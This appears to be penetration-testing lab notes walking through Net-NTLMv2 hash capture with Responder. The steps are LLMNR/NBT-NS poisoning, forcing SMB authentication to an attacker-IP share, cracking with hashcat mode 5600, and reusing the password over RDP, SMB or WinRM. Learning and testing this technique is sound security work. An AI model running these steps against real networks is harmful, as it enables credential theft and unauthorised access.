Net-NTLMv2 Capture & Crack with Responder

1. Scenario

You do not have access to privileged accounts or Mimikatz. Instead, you rely on capturing authentication attempts over the network.

Goal: Capture Net-NTLMv2 hashes and crack them offline.

2. Identify Network Interface
ip a

What to look for:

  • Your active interface (e.g., tun0, tap0, eth0)
  • IP address assigned to that interface
3. Start Responder
sudo responder -I INTERFACE

Example:

sudo responder -I tap0

What Responder does:

  • Poison LLMNR / NBT-NS / MDNS requests
  • Acts as rogue SMB/HTTP server
  • Captures NTLM authentication attempts
4. Trigger Authentication

From the target machine, force a connection to your Kali SMB server:

dir \\ATTACKER_IP\share

Example:

dir \\192.168.119.2\test

What happens:

  • Windows attempts SMB authentication
  • Credentials are sent as Net-NTLMv2 hash
  • Responder captures the hash
5. Capture Net-NTLMv2 Hash

Responder output will show something like:

[SMB] NTLMv2-SSP Username : DOMAIN\user
[SMB] NTLMv2-SSP Hash     : user::DOMAIN:challenge:response:blob

What to look for:

  • Username
  • Domain
  • Full Net-NTLMv2 hash string
6. Save the Hash
nano user.hash

Paste the full captured hash into the file.

Important:

  • Do not truncate the hash
  • Keep formatting intact
7. Identify Hashcat Mode
hashcat --help | grep -i ntlm

Relevant mode:

  • 5600 → Net-NTLMv2
8. Crack Net-NTLMv2 Hash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt

What this does:

  • Performs offline brute-force/dictionary attack
  • Attempts to recover plaintext password

Output example:

user::DOMAIN:...:password123
9. Validate Credentials

Use the cracked password to authenticate:

RDP
SMB
WinRM

Goal:

  • Confirm valid credentials
  • Gain access to the target system
10. Key Takeaways
  • No need for admin privileges on target
  • Relies on user interaction / authentication trigger
  • Works via LLMNR/NBT-NS poisoning
  • Net-NTLMv2 hashes can be cracked offline
Attack Flow
  1. Start Responder on attacker machine
  2. Trigger SMB authentication from target
  3. Capture Net-NTLMv2 hash
  4. Save hash locally
  5. Crack with Hashcat (mode 5600)
  6. Use recovered credentials
